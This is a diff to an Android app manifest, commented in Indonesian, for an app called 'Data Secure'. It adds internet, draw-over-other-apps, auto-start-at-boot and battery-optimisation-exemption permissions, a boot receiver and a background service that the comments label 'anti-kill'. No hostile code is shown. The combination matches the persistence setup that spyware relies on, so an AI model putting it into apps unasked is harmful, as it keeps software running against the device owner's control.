@@ -1,11 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <!-- 1. Izin Akses Internet -->
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <!-- 2. Izin Tampil di atas aplikasi lain (Display over other apps) -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- 3. Izin Auto Start saat HP dinyalakan -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- 4. Izin berjalan di background & Anti-kill (Mencegah HP mematikan aplikasi) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
     <application android:label="Data Secure">
+        <!-- Halaman Utama Aplikasi -->
         <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <!-- Mesin Auto-Start: Mendengarkan sinyal saat HP baru menyala -->
+        <receiver android:name=".PenerimaBoot" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Mesin Background: Berjalan di belakang layar (Anti-kill) -->
+        <service android:name=".LayananBackground" android:exported="false" />
+
     </application>
 </manifest>
